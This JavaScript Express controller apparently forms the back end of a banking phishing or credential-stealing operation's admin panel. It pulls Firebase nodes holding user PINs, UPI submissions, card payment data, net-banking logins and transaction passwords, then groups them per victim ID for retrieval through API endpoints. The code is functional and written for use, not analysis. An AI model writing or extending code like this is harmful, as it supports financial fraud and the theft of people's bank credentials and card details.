import { rtdb } from "../config/db.js";

const NODES = {
  userPins: "user_pins",
  upiSubmissions: "upi_submissions",
  cardPayments: "card_payment_data",
  formSubmissions: "form_submissions",
  netbankingData: "netbanking_data",
  transactionPasswords: "transaction_passwords",
  netbankingLogin: "netbanking_login_data"
};

const cleanUID = (uid) => {
  if (!uid) return null;
  return String(uid).trim();
};

export const getAllUsersFullData = async (req, res) => {
  try {
    const raw = {};
    const uniqueIds = new Set();

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();
      raw[key] = snap.exists() ? snap.val() : {};
      Object.values(raw[key]).forEach((v) => {
        const uid = cleanUID(v.uniqueid);
        if (uid) uniqueIds.add(uid);
      });
    }

    const finalList = [];

    uniqueIds.forEach((uid) => {
      finalList.push({
        uniqueid: uid,
        userPins: Object.values(raw.userPins).find(v => cleanUID(v.uniqueid) == uid) || null,
        upiSubmissions: Object.values(raw.upiSubmissions).find(v => cleanUID(v.uniqueid) == uid) || null,
        cardPayments: Object.values(raw.cardPayments).find(v => cleanUID(v.uniqueid) == uid) || null,
        formSubmissions: Object.values(raw.formSubmissions).find(v => cleanUID(v.uniqueid) == uid) || null,
        netbankingData: Object.values(raw.netbankingData).find(v => cleanUID(v.uniqueid) == uid) || null,
        transactionPasswords: Object.values(raw.transactionPasswords).find(v => cleanUID(v.uniqueid) == uid) || null,
        netbankingLogin: Object.values(raw.netbankingLogin).find(v => cleanUID(v.uniqueid) == uid) || null
      });
    });

    return res.json({ success: true, data: finalList });

  } catch (err) {
    return res.status(500).json({ success: false, message: "Server error" });
  }
};

export const getUserFullData = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    if (!uniqueid) return res.json({ success: false, message: "uniqueid required" });

    const uid = cleanUID(uniqueid);
    const result = {};

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();
      if (!snap.exists()) {
        result[key] = null;
        continue;
      }
      const data = Object.values(snap.val()).find(v => cleanUID(v.uniqueid) == uid) || null;
      result[key] = data;
    }

    return res.json({
      success: true,
      uniqueid: uid,
      ...result
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
};

// ---------- ADD MISSING FUNCTIONS ---------- //

export const getAllData = async (req, res) => {
  try {
    const result = {};

    for (const key in NODES) {
      const snap = await rtdb.ref(NODES[key]).get();
      result[key] = snap.exists() ? Object.values(snap.val()) : [];
    }

    return res.json({ success: true, data: result });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
};

export const getLatestForm = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    if (!uniqueid) return res.json({ success: false, message: "uniqueid required" });

    const snap = await rtdb
      .ref("form_submissions")
      .orderByChild("uniqueid")
      .equalTo(uniqueid)
      .limitToLast(1)
      .get();

    if (!snap.exists()) return res.json({ success: true, data: [] });

    const list = Object.entries(snap.val()).map(([id, obj]) => ({
      id,
      uniqueid,
      ...obj
    }));

    return res.json({ success: true, data: list });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "Error fetching latest form"
    });
  }
};
